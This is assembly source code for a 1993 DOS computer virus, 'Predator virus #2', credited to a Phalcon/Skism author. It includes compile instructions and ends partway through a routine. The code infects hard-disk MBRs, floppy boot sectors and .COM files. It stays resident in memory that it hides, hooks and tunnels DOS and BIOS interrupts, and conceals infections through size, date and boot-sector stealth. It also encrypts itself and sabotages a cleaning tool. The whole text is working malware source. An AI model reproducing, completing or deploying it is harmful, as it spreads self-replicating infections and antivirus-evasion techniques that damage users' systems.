.model  tiny
.code
;
;
;
;
;
;                             Predator virus #2
;
;                           Priest - Phalcon/Skism
;
;
;                    Special thanks to The Additude Ajuster
;
;                             Dedicated to ARCV
;
;
;
;
;
;
;       Compile with:
;
;       C:\>Tasm Pred2v.asm /mt3
;       C:\>Tlink Pred2v
;       C:\>Exe2bin Pred2v Pred2v.com
;
;       It is important to note that Tlink /T will not work, as this virus
;       has an origin of 0, therefore it is necessary that you have Exe2bin
;       or an equivalent program.




system_file     equ     00000100b

no              equ     0
yes             equ     1


trap_on         equ     1
trap_off        equ     not 1


find_13         equ     0
find_21         equ     1
find_40         equ     2
step_21         equ     3

years           equ     0c8h

jump_21         equ     0
iret_21         equ     pred2_21_iret - (exit_21 + 1)

pred2_13_do_21  equ     0
pred2_13_no_21  equ     pred2_13_cont - (pred2_13_check + 1)

pred2_size      equ     pred2_done - pred2

word_size       equ     (pred2_end - pred2 + 1) / 2
para_size       equ     (pred2_end - pred2 + 15) / 16
kilo_size       equ     (pred2_end - pred2 + 1023) / 1024

disk_size       equ     (pred2_size + 511) / 512

file_size       equ     (((pred2_size + 1) and -2) + (decrypt_start-decrypt))

com_ext         equ     ((( 'M' shl 4 xor 'O') shl 3 xor 'C') shl 2 xor ('.' and 0dfh)) shl 1

not_file_key1   equ     'P' xor '�'

not_file_key2   equ     'PPPP' xor '����'


;****************************************************************************;
;                                                                            ;
;                             Maps                                           ;
;                                                                            ;
;                 On Disk           In memory                                ;
;                                                                            ;
;              |-------------|    |-------------|                            ;
;              | Infected BS |    |             |                            ;
;              |-------------|    |             |                            ;
;                   ....          |             |                            ;
;              |-------------|    | Predator 2  |                            ;
;              | Original BS |    |             |                            ;
;              |-------------|    |             |                            ;
;              |             |    |             |                            ;
;              |             |    |-------------|                            ;
;              |             |    | Variables   |                            ;
;              | Predator 2  |    |-------------|                            ;
;              | (encrypted) |    | Original BS |                            ;
;              |             |    |-------------|                            ;
;              |             |    |             |                            ;
;              |-------------|    |             |                            ;
;                                 |             |                            ;
;                                 | encryption  |                            ;
;                                 | buffer      |                            ;
;                                 |             |                            ;
;                                 |             |                            ;
;                                 |             |                            ;
;                                 |-------------|                            ;
;                                                                            ;
;        BS = Boot Sector                                                    ;
;                                                                            ;
;****************************************************************************;


pred2:          push    es                      ; save psp segment
                xor     bp,bp                   ; we came from a file!
                mov     ax,'P�'                 ; Predator 2 in memory?
                int     13h
                cmp     ax,'�P'                 ; did Predator 2 reply?
                je      jump_host
                mov     ax,es
                mov     bx,ax
                dec     ax
                mov     ds,ax                   ; segment of mcb
                mov     ax,ds:[3]               ; get amount of memory
                sub     ax,para_size            ; hide right amount of                 
                                                ; paragraphs
                jb      jump_host
                cmp     ah,10h                  ; nuff memory left?
                jb      jump_host
                mov     ds:[3],ax               ; hide memory from mcb chain
                add     ax,bx                   ; seg of hidden memory
                mov     ds:[12h],ax             ; hide memory from psp
                mov     es,ax
                xor     di,di                   ; where to copy code to
                mov     ds,di                   ; segment 0
                sub     word ptr ds:[413h],kilo_size  ; hide memory from                
                                                ; BIOS int 12h
                push    cs
                pop     ds
                call    $ + 3
                pop     si
                sub     si,offset $ - 1         ; get offsets
                mov     cx,word_size
                cld
                rep     movsw                   ; copy pred2 high
                mov     ax,offset high_code
                push    es ax  
                retf



        db      0,'Predator virus #2  (c) 1993  Priest - Phalcon/Skism',0


;****************************************************************************;
;       Return control to host program.                                      ;
;****************************************************************************;


jump_host:      or      bp,bp                   ; in a file?
                je      jump_file_host
                retf                            ; returns to 0:7c00h

jump_file_host: call    $ + 3
                pop     si
                add     si,header - ($ - 1)     ; get offset of header (data
                                                ; necessary for jump to file)
                push    cs
                pop     ds
                cld
                lodsw                           ; get word at header
                cmp     ax,'MZ'                 ; .exe file?
                je      jump_exe_host
                cmp     ax,'ZM'                 ; .exe file?
                je      jump_exe_host
                pop     es
                mov     di,100h                 ; .com files start here
                push    di
                stosw                           ; repair .com file
                movsb
                pop     di                      ; ES:DI = pointer to .com
                                                ; file.
                push    es
                pop     ds
                call    anti_TBCLEAN            ; cause TBCLEAN to fail
                push    ds di
                xor     ax,ax
                retf                            ; jump to .com file


jump_exe_host:  pop     ax                      ; segment of psp
                mov     bx,ax
                add     ax,10h                  ; skip psp
                add     ds:[si+header_cs-(header+2)],ax ; add CS displacement
                add     ax,ds:[si+header_ss-(header+2)] ; get SS
                les     di,ds:[si+header_ip-(header+2)] ; get pointer to 1st
                                                        ; instruction
                call    anti_TBCLEAN                    ; make TBCLEAN fail
                cli
                mov     ss,ax                           ; set new SS
                mov     sp,ds:[si+header_sp-(header+2)] ; get new SP
                mov     es,bx
                mov     ds,bx                   ; set to psp segment
                xor     ax,ax
                sti
                jmp     dword ptr cs:[si+header_ip-(header+2)] ; jump to .exe

                
                


anti_TBCLEAN:   push    ax
                push    es:[di]                 ; save byte to be overwritten
                mov     byte ptr es:[di],0cbh   ; retf
                call    $ + 3
                pop     ax
                add     ax,anti_TBCLEAN_ret - ($ - 1) ; where to return to
                push    cs ax                   ; save return address
                push    es di                   ; simulate a CALL FAR ES:DI
                retf

anti_TBCLEAN_ret:pop    es:[di]                 ; restore overwritten byte
                pop     ax
                retn


;****************************************************************************;
;       This is the high memory entry point of point of Predator 2, it hooks ;
;       needed interrupts (13h and 21h).  If the host was a program (as      ;
;       opposed to a boot sector or MBR), Predator 2 will trace interrupts   ;
;       13h, 21h, and 40h in an attempt to locate the BIOS or DOS handlers   ;
;       for those interrupts (in order to avoid nasty protection programs).  ;
;       Predator 2 will do no tracing if loaded from a boot sector, since it ;
;       is hardly possible for a protection program to have already loaded.  ;
;       Additionally, Predator 2 will attempt to infect Drive C:'s MBR.      ;
;****************************************************************************;


high_code:      push    cs
                pop     ds
                mov     al,13h                  ; get int 13h
                mov     di,offset int_13
                mov     cx,2h                   ; do 3 ints
hook_loop:      call    get_int                 ; get the IVT in ES:BX
                mov     dx,es                   ; save segment
                push    cs
                pop     es
                xchg    bx,ax
                clc
hook_loop1:     cld
                stosw                           ; store off/seg in int_xx
                mov     ds:[di+2],ax            ; store off/seg in fake_xx
                xchg    dx,ax                   ; do seg next
                cmc
                jb      hook_loop1
                add     di,4h                   ; skip fake_xx
                dec     cx                      ; decrement counter
                js      hook_end
                mov     al,21h                  ; get int 21h
                jne     hook_loop
                mov     al,40h                  ; get int 40h
                jmp     short hook_loop

hook_end:       mov     al,13h                  ; hook int 13h
                mov     dx,offset pred2_13
                call    set_int
                mov     ds:tunnel_code,0eah     ; construct jump to tunnel
                mov     ds:tunnel_code_ip,offset pred2_21
                mov     ds:tunnel_code_cs,cs    ; point jump to CS:pred2_21
                mov     ah,1h                   ; get status
                mov     dl,80h                  ; for the first fixed disk
                int     13h
                or      ah,ah                   ; no error?
                je      got_hard_disk

;****************************************************************************;
;       If there is no hard disk, then there is no int 40h, so then          ;
;       we must copy int_13 - fake_13 to int_40 - fake_40                    ;
;****************************************************************************;

                mov     si,offset int_13        ; where predator 2 kept 
                                                ; the IVT for int 13h
                mov     di,offset int_40
                movsw
                movsw
                movsw
                movsw                           ; copy 8 bytes
                
got_hard_disk:  mov     ds:tunnel_spec,0c3h     ; No tunnneling if loading
                                                ; from a boot sector or MBR
                mov     ds:pred2_13_check,pred2_13_do_21 ; have pred2_13 
                                                ; monitor int 21h for changes 
                                                ; so that it can be hooked.
                or      bp,bp                   ; BP will equal 0 if the
                                                ; current host is a file,
                                                ; > 0 if the current host
                                                ; is a boot sector/MBR.
                jne     hard_infect
                mov     ds:pred2_13_check,pred2_13_no_21 ; Don't monitor int 
                                                ; 21h since we are going to
                                                ; tunnel it right now.
                
                call    find_int                ; find original int. if
                                                ; DOS is already loaded
                lds     di,cs:int_21            ; get address of int 21h
                cmp     byte ptr ds:[di],0eah   ; already hooked by another
                                                ; tunnelled virus?
                je      hook_no_tunnel
                cmp     byte ptr ds:[di],0cch   ; hooked by Dark Angel's
                                                ; and Hellraiser's 
                                                ; Shiny Happy virus?
                je      hook_no_tunnel
                mov     cs:tunnel_spec,50h      ; int 21h is to tunnel.
                call    tunnel                  ; tunnel jump into DOS
                jmp     short hard_infect

hook_no_tunnel: push    cs
                pop     ds
                mov     dx,offset pred2_21      ; our int 21h handler
                mov     al,21h
                call    set_int                 ; hook int 21h regular style

hard_infect:    push    cs cs
                pop     es ds
                mov     ax,201h                 ; read one sector                
                mov     bx,offset disk_buffer
                mov     cx,1h                   ; track 0, sector 1
                mov     dx,0080h                ; head 0, drive C:
                call    call_13
                jb      no_hard_infect
                
                call    check_infection         ; is disk already infected?
                je      no_hard_infect
                call    boot_crypt              ; encrypt boot sector
                call    disk_crypt              ; encrypt Predator 2 for disk
                inc     cx                      ; sector 2
                mov     ax,300h + disk_size + 1 ; write predator 2 and MBR
                call    call_13
                jb      no_hard_infect
                call    boot_crypt              ; decrypt boot sector
                call    copy_loader             ; copy loader into boot s.
                mov     ax,301h                 ; write one sector
                dec     cx                      ; sector 1
                call    call_13                 ; write infected MBR
no_hard_infect: jmp     jump_host


;****************************************************************************;
;       Has disk been previously infected?                                   ;                
;****************************************************************************;

check_infection:push    cx si di
                mov     cx,loader_key - loader  ; number of bytes to compare
                mov     di,offset disk_buffer   ; location of boot sector
                mov     si,offset loader
                cld
                repe    cmpsb                   ; compare boot sector with
                                                ; loader
                pop     di si cx
                retn


;****************************************************************************;
;       Copy loader into boot sector and encrypt loader.                     ;
;****************************************************************************;

copy_loader:    push    ax bx cx dx di si
                mov     ax,-1h
                call    random                  ; get a random key
                mov     ds:loader_key,ax        ; save key in loader
                inc     cx                      ; Predator start, not boot
                                                ; sector
                mov     ds:loader_sec,cx        ; save track, sector
                and     dl,80h                  ; either A: or C:
                mov     ds:loader_head,dx       ; save head, drive
                mov     di,offset disk_buffer
                mov     si,offset loader
                mov     cx,loader_crypt - loader
                cld
                rep     movsb                   ; copy loader into MBR
                xchg    cx,ax                   ; move key into AX
                mov     bx,(loader_end - loader_crypt + 1) / 2
copy_load_loop: lodsw
                rol     ax,cl                   ; encrypt loader
                stosw
                rol     cx,1                    ; change key
                dec     bx
                jne     copy_load_loop
                pop     si di dx cx bx ax
                retn

                
;****************************************************************************;
;       Encrypt/decrypt boot sector                                          ;
;****************************************************************************;

boot_crypt:     push    cx di si
                mov     di,offset disk_buffer
                mov     cx,100h                 ; 512 bytes
boot_crypt_loop:not     word ptr ds:[di]        ; crypt boot sector
                inc     di
                inc     di
                loop    boot_crypt_loop
                pop     si di  cx
                retn

                db      'H' shl 1
                db      'e' shl 1
                db      'r' shl 1
                db      'e' shl 1
                db      ' ' shl 1
                db      'c' shl 1
                db      'o' shl 1
                db      'm' shl 1
                db      'e' shl 1
                db      's' shl 1
                db      ' ' shl 1
                db      't' shl 1
                db      'h' shl 1
                db      'e' shl 1
                db      ' ' shl 1
                db      'P' shl 1
                db      'r' shl 1
                db      'e' shl 1
                db      'd' shl 1
                db      'a' shl 1
                db      't' shl 1
                db      'o' shl 1
                db      'r' shl 1
                db      '!' shl 1
                
                
;****************************************************************************;
;       Encrypt Predator just enough to hide any text strings from           ;
;       programs like Norton Utilities                                       ;
;****************************************************************************;

disk_crypt:     push    cx di si
                mov     cx,(pred2_size + 1) / 2
                mov     di,offset crypt_buff
                xor     si,si                   ; offset of predator 2
                cld
disk_crypt_lp1: lodsw
                ror     ax,cl                   ; encrypt virus
                stosw
                loop    disk_crypt_lp1
                pop     si di cx
                retn

;****************************************************************************;
;       This is the loader routine that gets inserted into infected boot     ;
;       sectors.                                                             ;
;****************************************************************************;


loader:         cli     
                mov     di,(loader_crypt - loader) + 7c00h
                mov     ax,((loader_end - loader_crypt) + 1) / 2
                db      0b9h                    ; mov cx,
loader_key      dw      ?                       ; cryption key
loader_loop:    ror     word ptr cs:[di],cl     ; decrypt code
                rol     cx,1                    ; change key
                inc     di
                inc     di
                dec     ax
                jne     loader_loop
loader_crypt:   mov     ss,ax                   ; 0
                mov     sp,-2                   ; make a stack
                sti
                mov     ds,ax
                mov     bx,ax
                sub     word ptr ds:[413h],kilo_size ; hide memory from
                                                ; int 12h
                int     12h                     ; get memory
                mov     cl,0ah
                ror     ax,cl                   ; get address of memory
                mov     es,ax
                xchg    bp,ax                   ; remember segment
                mov     ax,200h + disk_size     ; read function + size of
                                                ; predator 2 on disk in
                                                ; 512 byte sectors
                db      0b9h                    ; mov cx,
loader_sec      dw      ?
                db      0bah                    ; mov dx,
loader_head     dw      ?
                push    ax cx                   ; save function, location
                int     13h                     ; read predator into hidden
                                                ; memory
                jnb     loader_ok
                int     18h                     ; shit!

loader_ok:      mov     di,bx                   ; address of Predator 2
                mov     cx,(pred2_size + 1) / 2 ; decret all of predator 2
loader_loop1:   rol     word ptr es:[di],cl     ; decrypt predator
                inc     di
                inc     di
                loop    loader_loop1
                mov     es,bx                   ; segment 0
                mov     di,7c00h - (reloc_end - reloc)
                mov     cx,reloc_end - reloc
                mov     si,(reloc - loader) + 7c00h
                cld
                rep     movsb
                mov     ds:[di-2],bp            ; save segment of predator 2
                                                ; in CALL xxxx:high_code
                pop     cx ax                   ; get location of predator 2
                mov     al,1h                   ; read 1 sector
                mov     bx,di                   ; 7c00h
                dec     cx                      ; location of boot sector
                
                db      0ebh                    ; jump to relocated code
                db      ((loader+(reloc-reloc_end))-($+1))
                

;****************************************************************************;
;       This code is copied to 7c00h - (reloc_end-reloc), when it is jumped  ;
;       to, it loads the original boot sector then calls to Predator 2 in    ;
;       high memory                                                          ;
;****************************************************************************;

reloc:          int     13h                     ; read real boot sector
                jnb     reloc_ok
                int     18h                     ; shit!

reloc_ok:       mov     cx,100h                 ; 512 bytes
reloc_crypt:    not     word ptr ds:[di]        ; decrypt boot sector
                inc     di
                inc     di
                loop    reloc_crypt
                db      09ah
                dw      offset high_code
                dw      ?
reloc_end:      
loader_end:               
                
;****************************************************************************;
;       Locate original interrupt handlers for ints 13h, 21h, and 40h, and   ;
;       tunnel int 21h.                                                      ;
;****************************************************************************;

find_int:       mov     ah,52h                  ; get DOS list of list
                int     21h
                mov     ax,es:[bx - 2]          ; get address of 1st mcb
                mov     ds:dos_seg,ax           ; save address for tracer
                mov     al,1
                call    get_int                 ; get address of int 1h
                push    bx                      ; save address of int 1h
                mov     dx,offset tracer
                call    set_int                 ; set address of int 1h
                mov     ds:trace_mode,find_13   ; look for int 13h
                pushf
                pop     bx
                or      bh,trap_on              ; trap flag on
                push    bx
                popf
                mov     ah,1h                   ; dummy function
                call    call_13
                mov     ds:trace_mode,find_21   ; find int 21h
                push    bx
                popf                            ; trap flag on
                mov     ah,30h                  ; dummy function
                call    call_21
                mov     ds:trace_mode,find_40   ; find int 40h
                push    bx
                popf                            ; trap flag on
                mov     ah,1                    ; dummy function
                call    call_40
                and     bh,trap_off             ; trapping off
                push    bx
                popf                            
                pop     dx                      ; address of old int 1h
                push    es
                pop     ds
                mov     al,1
                call    set_int                 ; unhook int 1h
                retn

;****************************************************************************;
;       The tracer is used to find the original owners of ints 13h, 21h, and ;
;       40h, it is also used to trace the first 5 bytes of the int 21h       ;
;       handler so that Predator 2 can tunnel a jump into the DOS code.      ;
;****************************************************************************;

tracer:         push    bp
                mov     bp,sp                   ; get stack
                push    ax ds
                push    cs
                pop     ds
                mov     ax,ss:[bp.st_cs]        ; get CS of current inst.
                cmp     ds:trace_mode,find_21   ; looking for DOS?
                jne     tracer_chk_disk
                cmp     ax,ds:dos_seg           ; is it below the first mcb?
                ja      tracer_iret
                mov     word ptr ds:int_21+2,ax ; save address of int 21h
                mov     ax,ss:[bp.st_ip]        ; get IP of current inst.
                mov     word ptr ds:int_21,ax   ; save offset of int 21h
tracer_end:     and     word ptr ss:[bp.st_flags],0feffh ; trapping off!
tracer_iret:    pop     ds ax bp
                iret

tracer_chk_disk:cmp     ds:trace_mode,find_40   ; looking for 13h or 40h?
                ja      tracer_step
                cmp     ax,0c800h               ; is it below the BIOS?
                jb      tracer_iret
                cmp     ax,0f000h               ; is it above the BIOS?
                ja      tracer_iret
                push    di
                mov     di,offset int_13
                cmp     ds:trace_mode,find_13   ; looking for 13h or 40h?
                je      tracer_13
                add     di,offset int_40 - offset int_13 ; point to int_40

tracer_13:      mov     ds:[di+2],ax            ; save address of int
                mov     ax,ss:[bp.st_ip]        ; get offset of int
                mov     ds:[di],ax              ; save address of int
                pop     di
                jmp     short tracer_end

tracer_step:    dec     ds:step_inst            ; number of instructions
                                                ; to step
                jne     tracer_iret             ; have we traced enough?
                call    tunnel                  ; tunnel jump into DOS
                mov     al,01h                  ; unhook int 1h
                push    dx
                lds     dx,ds:[int_1]           ; get address of int 1h
                call    set_int
                pop     dx
                jmp     short tracer_end


;****************************************************************************;
;       Swap a jump to pred2_21 with the code at the DOS handler of int 21h  ;
;****************************************************************************;
;                                                                            ;
;                                                                            ;
;       Before - 0116:109E 90           NOP                                  ;
;                0116:109F 90           NOP                                  ;
;                0116:109F E8CC00       CALL    116F                         ;
;                0116:10A3 2E           CS:                                  ;
;                0116:10A4 FF2E6A10     JMP     FAR [106A]                   ;
;                                                                            ;
;       After  - 0116:109E EAC303449F   JMP     9F44:03C3                    ;
;                0116:10A3 2E           CS:                                  ;
;                0116:10A4 FF2E6A10     JMP     FAR [106A]                   ;
;                                                                            ;
;****************************************************************************;
;                                                                            ;
;       Because DOS uses self-modifying code (i.e. those two NOPs become a   ;
;       JMP 10A3 if DOS=HIGH is not set (I think that's what sets it)),      ;
;       Predator 2 can NOT tunnel when loaded from the boot sector, instead, ;
;       Predator 2 must hook int 21h the "regular" way.                      ;
;                                                                            ;
;****************************************************************************;


tunnel:         
tunnel_spec     db      ?                       ; PUSH AX (50h) if we are
                                                ; to do tunnelling, RETN 
                                                ; (c3h) if no tunnelling is
                                                ; to occur - self modifying
                                                ; code.
                push    cx di si ds es
                pushf
                push    cs
                pop     ds
                mov     si,offset tunnel_code   ; code to insert into DOS
                les     di,ds:[int_21]          ; get address of DOS
                mov     cx,5h
                cld
tunnel_loop:    lodsb                           ; get byte from tunnel code
                xchg    es:[di],al              ; put in DOS; get byte from
                                                ; DOS
                mov     ds:[si-1],al            ; save byte from DOS at
                                                ; tunnel code
                inc     di                      ; next byte
                loop    tunnel_loop
                popf
                pop     es ds si di cx ax
                retn



;****************************************************************************;
;       Gets the IVT of the interrupt in AL.                                 ;
;****************************************************************************;

get_int:        push    ax ds
                cbw
                shl     ax,1
                shl     ax,1
                xchg    bx,ax                   ; use BX as index
                xor     ax,ax
                mov     ds,ax                   ; segment 0
                les     bx,ds:[bx]              ; get IVT of int
                pop     ds ax
                retn

;****************************************************************************;
;       Sets the IVT of the interrupt in AL.
;****************************************************************************;

set_int:        push    ax bx ds es
                cbw
                shl     ax,1
                shl     ax,1
                xchg    bx,ax                   ; use BX as index
                xor     ax,ax
                mov     es,ax                   ; segment 0
                mov     es:[bx],dx              ; set IVT of int
                mov     es:[bx+2],ds            ; set IVT of int
                pop     es ds bx ax
                retn
                
                db      not 'T'
                db      not 'H'
                db      not 'E'
                db      not ' '
                db      not 'P'        
                db      not 'R'
                db      not 'E'
                db      not 'D'
                db      not 'A'
                db      not 'T'
                db      not 'O'
                db      not 'R'
                
;****************************************************************************;
;       Predator 2's interrupt 13h handler.  First check to see if we are    ;
;       waiting for DOS to hook int 21h, if we are, and the int 21h vector   ;
;       has been changed then tunnel into int 21h.                           ;
;                                                                            ;
;****************************************************************************;
;                                                                            ;
;       The following self-modifying code is a jump that tells Predator 2's  ;
;       interrupt 13h handler where to jump, a 0 at pred2_13_check will      ;
;       cause the code following pred_2_13_hook to be executed, which        ;
;       checks to see if int 21h has changed, and if it has, Predator 2 will ;
;       hook it, then set pred2_13_check so that the code doesn't execute    ;
;       again.  If not loaded from the boot sector, the proper displacement  ;
;       from pred2_13_check+1 to pred2_13_cont is put at pred2_13_check so   ;
;       that int 21h is not rehooked.                                        ;
;                                                                            ;
;****************************************************************************;


pred2_13:       db      0ebh                    ; jump short
pred2_13_check  db      ?                       

                call    push_all                ; save registers
                
                mov     al,21h                  ; IVT of int 21h
                call    get_int                 
                push    cs
                pop     ds
                mov     di,offset int_21
                cmp     ds:[di],bx              ; has it been changed?
                jne     pred2_13_hook
pred2_13_no_hook:call   pop_all                 ; pop registers
                jmp     short pred2_13_cont

pred2_13_hook:  mov     ax,es                   ; segment of int 21h
                push    cs
                pop     es
                cmp     ax,800h                 ; is it a temp. change?
                ja      pred2_13_no_hook
                cld
                clc                             ; set up loop
pred2_13_hook_loop:xchg    bx,ax
                stosw                           ; save at int_21
                mov     ds:[di + 2],ax          ; save at fake_21
                cmc
                jb      pred2_13_hook_loop
                mov     ds:pred2_13_check,pred2_13_no_21 ; no more monitoring
                mov     al,21h                  ; hook int 21h
                mov     dx,offset pred2_21
                call    set_int                 
                jmp     short pred2_13_no_hook


pred2_13_cont:  cmp     ah,2h                   ; read?
                jne     pred2_13_ayh
                cmp     cx,1h                   ; track 0, sector 1?
                jne     pred2_13_ayh
                cmp     dh,0h                   ; head zero?
                je      pred2_13_boot
                
pred2_13_ayh:   cmp     ax,'P�'                 ; 'are you here' call?
                jne     pred2_13_jump
                mov     ax,'�P'                 ; yes we are
                
pred2_13_iret:  retf    2h                      ; return to caller

pred2_13_jump:  jmp     cs:fake_13              ; jump on to int 13h



pred2_13_boot:  call    call_fake_13            ; read boot sector
                jb      pred2_13_iret
                call    push_all                ; save returns
                mov     di,offset disk_buffer   ; where to put boot sector
                push    es
                push    cs
                pop     es
                pop     ds
                mov     si,bx                   ; boot sector at DS:SI
                mov     cx,100h                 ; 512 bytes
                cld
                rep     movsw                   ; copy boot sector to
                                                ; disk_buffer
                push    ds
                push    cs
                pop     ds
                call    check_infection         ; is it already infected?
                pop     es
                jne     pred2_13_infect

;****************************************************************************;
;                                                                            ;
;       If the disk is infected, then return a clean copy of the boot.       ;
;       This requires that we decrypt the Predator 2 loader inside the       ;
;       to find out where the original boot sector is.                       ;       
;                                                                            ;
;****************************************************************************;

                mov     di,offset disk_buffer + (loader_crypt - loader)
                mov     cx,ds:[di-(loader_crypt-loader_key)]  ; get key
                mov     ax,((loader_end - loader_crypt) + 1) / 2
boot_stealth_lp:ror     word ptr ds:[di],cl     ; decrypt loader
                rol     cx,1                    ; change key
                inc     di
                inc     di
                dec     ax                      ; down counter
                jne     boot_stealth_lp

;****************************************************************************;                                                                             
;       Fetch location of Predator 2 on the infected disk.                   ;
;****************************************************************************;
                
                call    pop_all
                push    bx cx dx
                mov     ax,201h                 ; read sector
                mov     cx,cs:[disk_buffer+(loader_sec-loader)]
                mov     dh,byte ptr cs:[disk_buffer+(loader_head-loader)+1]
                dec     cx                      ; sector of boot sector
                call    call_disk
                pushf
                mov     cx,100h                 ; decrypt 512 bytes
boot_stealth_lp1:not    word ptr es:[bx]        ; decrypt boot sector
                inc     bx
                inc     bx
                loop    boot_stealth_lp1
                popf
                pop     dx cx bx
                jmp     short pred2_13_iret     ; return to caller

pred2_13_no_inf:call    pop_all                 ; get returns of read
                jmp     short pred2_13_iret

pred2_13_infect:cmp     dl,80h                  ; hard disk?
                jnb     pred2_13_no_inf
                
;****************************************************************************;
;                                                                            ;
;       Find last head/track/sector of disk from Bios Parameter Block, then  ;
;       write Predator and original boot sector to last head/track/          ;
;       (sector - (disk_size + 1)).  See On Disk Map.                        ;
;                                                                            ;
;****************************************************************************;
                
                push    cs
                pop     es
                mov     si,dx                   ; save drive
                mov     di,offset disk_buffer   ; use DI as an index
                mov     ax,ds:[di.bs_sectors_per_track] ; # of sectors to 
                                                ; subtract
                sub     ds:[di.bs_sectors],ax   ; hide predator
                mov     cx,ax                   ; use sectors per track as
                                                ; a divisor for total sectors
                                                ; to find out how many tracks
                                                ; are on the disk
                add     ax,ds:[di.bs_sectors]   ; get total number of sectors
                or      ax,ax                   ; can't be zero
                je      pred2_13_no_inf
                jcxz    pred2_13_no_inf         ; can't divide by zero
                xor     dx,dx
                div     cx
                or      dx,dx                   ; was it even?
                jne     pred2_13_no_inf
                mov     bx,ds:[di.bs_heads]     ; number of heads
                or      bx,bx                   ; can't be zero
                je      pred2_13_no_inf
                div     bx
                or      dx,dx                   ; was it even?
                jne     pred2_13_no_inf
                mov     dx,si                   ; get drive
                dec     bx                      ; heads are zero based
                mov     dh,bl                   ; number of heads into DH
                dec     ax                      ; tracks are zero based
                mov     ch,al                   ; number of tracks
                mov     cl,1                    ; sector 1
                mov     bx,di                   ; offset disk_buffer
                call    boot_crypt              ; encrypt boot sector
                call    disk_crypt              ; encrypt Predator 2 for disk
                                                ; infection
                mov     ax,300h + (disk_size+1) ; write Predator 2 + boot
                                                ; sector
                mov     bx,offset disk_buffer
                call    call_40
                jb      pred2_13_no_inf
                call    boot_crypt              ; decrypt boot sector
                call    copy_loader             ; move loader into boot
                                                ; sector
                mov     ax,301h                 ; write infected boot sector
                mov     cx,1                    ; track 0, sector 1
                xor     dh,dh                   ; head 0
                call    call_40
                call    pop_all                 ; get returns of read
                pushf
                push    ax
                mov     ax,es:[bx.bs_sectors_per_track]
                sub     es:[bx.bs_sectors],ax   ; hide Predator 2
                pop     ax
                popf
                jmp     pred2_13_iret


;****************************************************************************;
;       Predator 2's interrupt 21h handler.                                  ;
;****************************************************************************;

pred2_21:       call    tunnel                  ; first, take jump out of
                                                ; DOS's code
                call    push_all                ; save all registers
                mov     al,1h                   ; get address of int 1h
                call    get_int
                push    cs
                pop     ds
                mov     word ptr ds:int_1,bx    ; save address of int 1h
                mov     word ptr ds:int_1+2,es
                mov     ds:exit_21,iret_21      ; If AH = 11h, 12h, 4eh or 4fh
                                                ; then return to caller
                call    pop_all                 ; get registers of caller
                
                cmp     ah,11h                  ; find FCB                
                je      pred2_21_fcb
                cmp     ah,12h                  ; find next FCB
                jne     pred2_21_is_dta

;****************************************************************************;
;       Hide file size increase on functions 11h and 12h.                    ;
;****************************************************************************;

pred2_21_fcb:   call    call_fake_21            ; do the find
                call    push_all                ; save returns
                or      al,al                   ; error?
                jne     pred2_21_fcb_end
                mov     bx,dx                   ; DS:BX = FCB
                mov     cl,ds:[bx]              ; get fcb type specifier
                mov     ah,2fh
                call    call_21                 ; get DTA address
                inc     cl                      ; ZR if extended FCB
                jne     pred2_21_fcb_next
                add     bx,7h                   ; fix offsets
pred2_21_fcb_next:cmp   byte ptr es:[bx.ds_date+1],years  ; infected?
                jb      pred2_21_fcb_end
                sub     byte ptr es:[bx.ds_date+1],years  ; fix date
                sub     word ptr es:[bx.ds_size],file_size  ; fix size
                sbb     word ptr es:[bx.ds_size+2],0        ; fix high size

pred2_21_fcb_end:jmp     pred2_21_exit                


;****************************************************************************;
;       Hide file size increase on functions 4eh and 4fh.                    ;
;****************************************************************************;

pred2_21_is_dta:cmp     ah,4eh                  ; find file?
                je      pred2_21_dta
                cmp     ah,4fh                  ; find next file?
                jne     pred2_21_check

pred2_21_dta:   call    call_fake_21            ; find file
                call    push_all
                mov     ah,2fh                  ; get dta address
                call    call_21
                cmp     byte ptr es:[bx.dta_date+1],years  ; infected?
                jb      pred2_21_dta_end
                sub     byte ptr es:[bx.dta_date+1],years      ; fix date
                sub     word ptr es:[bx.dta_size],file_size  ; fix size
                sbb     word ptr es:[bx.dta_size+2],0        ; fix high size

pred2_21_dta_end:jmp     pred2_21_exit           ; and exit


;****************************************************************************;
;       Check to see if there's a file to infect.                            ;
;****************************************************************************;

pred2_21_check: mov     cs:exit_21,jump_21      ; jump on to interrupt 21h
                call    push_all
                cmp     ah,3dh                  ; open file?
                je      pred2_21_open
                cmp     ah,4bh                  ; execute file?
                je      pred2_21_exec
                cmp     ah,6ch                  ; extended open?
                jne     pred2_21_exit
                test    cl,system_file          ;Is it a system file?
                jne     pred2_21_exit           ; exit if so
                mov     dx,si                   ; file ptr in DS:DX
                jmp     short pred2_21_open

pred2_21_exec:  or      al,al                   ; execute?
                jne     pred2_21_exit

;****************************************************************************;
;       Make proper preperations for infection.                              ;
;****************************************************************************;

pred2_21_open:  push    dx ds                   ; save file ptr
                push    cs
                pop     ds
                mov     al,24h                  ; get IVT of int 24h
                call    get_int
                mov     dx,offset pred2_21_24   ; bypass error messages
                call    set_int                 ; set address of int 24h
                pop     ds dx                   ; get file ptr
                push    ax bx es                ; save int 24h address
                call    is_com                  ; is it a .com file?
                jb      pred2_21_no_inf
                mov     ax,4300h                ; get attribute
                call    call_21
                jb      pred2_21_no_inf
                test    cl,system_file          ; is it a system file?
                jne     pred2_21_no_inf
                mov     ax,4301h                ; set attribute
                push    ax cx dx ds             ; save attribute and file ptr
                xor     cx,cx                   ; set to 0
                call    call_21
                jb      restore_attr
                mov     ax,3d02h                ; open file
                call    call_21
                jb      restore_attr
                xchg    bx,ax                   ; handle into BX
                push    cs
                pop     ds
                mov     ax,5700h                ; get file date
                int     21h
                jb      close
                cmp     dh,years                ; already infected?
                jnb     close
                push    cx dx                   ; save date
                call    infect_file
                pop     dx cx                   ; get date
                jb      close
                add     dh,years                ; mark as infected
                mov     ax,5701h                ; reset date
                call    call_21
close:          mov     ah,3eh                  ; close file
                call    call_21
restore_attr:   pop     ds dx cx ax             ; get file ptr, attribute
                call    call_21                 ; AX = 4301; Set attribute
pred2_21_no_inf:pop     ds dx ax                ; IVT of int 24h
                call    set_int                 ; unhook int 24h


;****************************************************************************;
;       Exit int 21h                                                         ;
;****************************************************************************;
;                                                                            ;
;       Pred2_21_exit contains a jump that either jumps to a routine to      ;
;       return to the caller, or jumps to the routine that jumps to int 21h. ;
;       It is self-modifying code.                                           ;
;****************************************************************************;


pred2_21_exit:  call    pop_all
                db      0ebh                    ; jump short
exit_21         db      ?
                
                call    push_all
                push    cs
                pop     ds
                mov     ds:trace_mode,step_21   ; step into int 21h
                mov     ds:step_inst,5          ; step over 5 instructions
                mov     al,1h                   ; hook int 1h
